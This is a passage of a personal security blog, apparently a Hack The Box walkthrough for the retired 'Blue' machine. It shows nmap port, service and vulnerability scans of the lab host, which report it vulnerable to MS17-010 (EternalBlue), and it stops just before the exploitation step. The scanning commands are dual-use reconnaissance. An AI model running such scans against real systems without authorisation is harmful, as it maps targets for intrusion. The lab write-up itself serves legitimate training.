@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Blue | Welcome to another retired Hack The Box named Blue. This particular box demonstrates the severity of the EternalBlue exploit, which has been used...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Blue</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-02-12 19:07:00+00:00">Wed 12 February 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Blue.html">Blue</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Blue.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Welcome to another retired Hack The Box named Blue. This particular box demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly in March 2017. </p>
+<h1>Initial Nmap</h1>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="mf">10.10.10.40</span><span class="w">                                                                                                                                                     </span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">12</span><span class="w"> </span><span class="mi">19</span><span class="err">:</span><span class="mi">01</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.40</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.019</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65526</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">  </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w"></span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="p">(</span><span class="nl">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span><span class="w"></span>
+<span class="mi">49152</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">49153</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">49156</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">49157</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="err">:</span><span class="w"> </span><span class="n">HARIS</span><span class="o">-</span><span class="n">PC</span><span class="p">;</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w"></span>
+
+<span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="nl">results</span><span class="p">:</span><span class="w"></span>
+<span class="o">|</span><span class="n">_smb2</span><span class="o">-</span><span class="nc">time</span><span class="err">:</span><span class="w"> </span><span class="n">Protocol</span><span class="w"> </span><span class="n">negotiation</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="n">SMB2</span><span class="p">)</span><span class="w"> </span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">199.25</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>Port 445 (smb) seems to produce some interesting information, so let's explore port 445 in more details:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">blue</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">445</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="mf">10.10.10.40</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">12</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">58</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.40</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.023</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+
+<span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">Professional</span><span class="w"> </span><span class="mi">7601</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="n">Pack</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="p">(</span><span class="nl">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="err">:</span><span class="w"> </span><span class="n">HARIS</span><span class="o">-</span><span class="n">PC</span><span class="p">;</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w"></span>
+
+<span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="nl">results</span><span class="p">:</span><span class="w"></span>
+<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="nl">skew</span><span class="p">:</span><span class="w"> </span><span class="nl">mean</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="nl">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="nl">median</span><span class="p">:</span><span class="w"> </span><span class="mi">48</span><span class="n">s</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="nl">discovery</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">Professional</span><span class="w"> </span><span class="mi">7601</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="n">Pack</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">Professional</span><span class="w"> </span><span class="mf">6.1</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="n">OS</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="nl">windows_7</span><span class="p">:</span><span class="err">:</span><span class="nl">sp1</span><span class="p">:</span><span class="n">professional</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="n">Computer</span><span class="w"> </span><span class="nl">name</span><span class="p">:</span><span class="w"> </span><span class="n">haris</span><span class="o">-</span><span class="n">PC</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">computer</span><span class="w"> </span><span class="nl">name</span><span class="p">:</span><span class="w"> </span><span class="n">HARIS</span><span class="o">-</span><span class="n">PC</span><span class="err">\</span><span class="n">x00</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nl">Workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="err">\</span><span class="n">x00</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="k">System</span><span class="w"> </span><span class="nc">time</span><span class="err">:</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">12</span><span class="nl">T22</span><span class="p">:</span><span class="mi">59</span><span class="err">:</span><span class="mi">55</span><span class="o">+</span><span class="mi">00</span><span class="err">:</span><span class="mi">00</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="nl">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nl">account_used</span><span class="p">:</span><span class="w"> </span><span class="n">guest</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nl">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="k">user</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nl">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="n">supported</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="nl">message_signing</span><span class="p">:</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="p">(</span><span class="n">dangerous</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="k">default</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="nl">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mf">2.02</span><span class="err">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">required</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="nc">time</span><span class="err">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nc">date</span><span class="err">:</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">12</span><span class="nl">T22</span><span class="p">:</span><span class="mi">59</span><span class="err">:</span><span class="mi">54</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="nl">start_date</span><span class="p">:</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">12</span><span class="nl">T22</span><span class="p">:</span><span class="mi">11</span><span class="err">:</span><span class="mi">17</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">15.69</span><span class="w"> </span><span class="n">seconds</span><span class="w"> </span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">445</span><span class="w"> </span><span class="c1">--script vuln -sV 10.10.10.40</span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">12</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">32</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.40</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.018</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+
+<span class="n">PORT</span><span class="w">    </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="p">(</span><span class="nl">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="n">_clamav</span><span class="o">-</span><span class="k">exec</span><span class="err">:</span><span class="w"> </span><span class="nl">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="k">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="err">:</span><span class="w"> </span><span class="n">HARIS</span><span class="o">-</span><span class="n">PC</span><span class="p">;</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w"></span>
+
+<span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="nl">results</span><span class="p">:</span><span class="w"></span>
+<span class="o">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mi">054</span><span class="err">:</span><span class="w"> </span><span class="k">false</span><span class="w"></span>
+<span class="o">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mi">061</span><span class="err">:</span><span class="w"> </span><span class="n">NT_STATUS_OBJECT_NAME_NOT_FOUND</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms17</span><span class="o">-</span><span class="mi">010</span><span class="err">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nl">VULNERABLE</span><span class="p">:</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">SMBv1</span><span class="w"> </span><span class="n">servers</span><span class="w"> </span><span class="p">(</span><span class="n">ms17</span><span class="o">-</span><span class="mi">010</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w">     </span><span class="k">State</span><span class="err">:</span><span class="w"> </span><span class="n">VULNERABLE</span><span class="w"></span>
+<span class="o">|</span><span class="w">     </span><span class="nl">IDs</span><span class="p">:</span><span class="w">  </span><span class="nl">CVE</span><span class="p">:</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2017</span><span class="o">-</span><span class="mi">0143</span><span class="w"></span>
+<span class="o">|</span><span class="w">     </span><span class="n">Risk</span><span class="w"> </span><span class="nl">factor</span><span class="p">:</span><span class="w"> </span><span class="n">HIGH</span><span class="w"></span>
+<span class="o">|</span><span class="w">       </span><span class="n">A</span><span class="w"> </span><span class="n">critical</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="ow">exists</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">SMBv1</span><span class="w"></span>
+<span class="o">|</span><span class="w">        </span><span class="n">servers</span><span class="w"> </span><span class="p">(</span><span class="n">ms17</span><span class="o">-</span><span class="mi">010</span><span class="p">).</span><span class="w"></span>
+<span class="o">|</span><span class="w">           </span>
+<span class="o">|</span><span class="w">     </span><span class="n">Disclosure</span><span class="w"> </span><span class="nc">date</span><span class="err">:</span><span class="w"> </span><span class="mi">2017</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">14</span><span class="w"></span>
+<span class="o">|</span><span class="w">     </span><span class="k">References</span><span class="err">:</span><span class="w"></span>
+<span class="o">|</span><span class="w">       </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">technet</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="o">/</span><span class="n">library</span><span class="o">/</span><span class="n">security</span><span class="o">/</span><span class="n">ms17</span><span class="o">-</span><span class="mf">010.</span><span class="n">aspx</span><span class="w"></span>
+<span class="o">|</span><span class="w">       </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">cve</span><span class="p">.</span><span class="n">mitre</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">cvename</span><span class="p">.</span><span class="n">cgi</span><span class="vm">?</span><span class="n">name</span><span class="o">=</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2017</span><span class="o">-</span><span class="mi">0143</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">blogs</span><span class="p">.</span><span class="n">technet</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">msrc</span><span class="o">/</span><span class="mi">2017</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="n">customer</span><span class="o">-</span><span class="n">guidance</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="n">wannacrypt</span><span class="o">-</span><span class="n">attacks</span><span class="o">/</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">30.73</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>From the above output it's clear that the machine in question is vulnerable to <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010">MS17-010</a>, aka EthernalBlue, which could allow remote code execution if an attacker sends specially crafted messages to a Microsoft Server Message Block 1.0 (SMBv1) server.</p>
+<p>Let's see how we can exploit that. </p>
